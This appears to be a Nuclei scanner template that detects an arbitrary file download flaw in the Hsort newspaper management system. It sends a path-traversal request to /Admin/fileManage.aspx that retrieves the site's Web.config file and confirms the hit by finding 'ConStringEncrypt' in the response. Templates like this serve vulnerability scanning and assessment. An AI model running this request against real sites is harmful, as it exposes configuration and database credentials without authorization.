id: hsort-fileRead

info:
  name: Hsort报刊管理系统fileManage.aspx任意文件下载
  author: str1am
  severity: high
  tags: hsort,fileRead

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Admin/fileManage.aspx?action=DOWNLOAD&value1=~%2FWeb.config"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "ConStringEncrypt"
        part: body
        condition: and
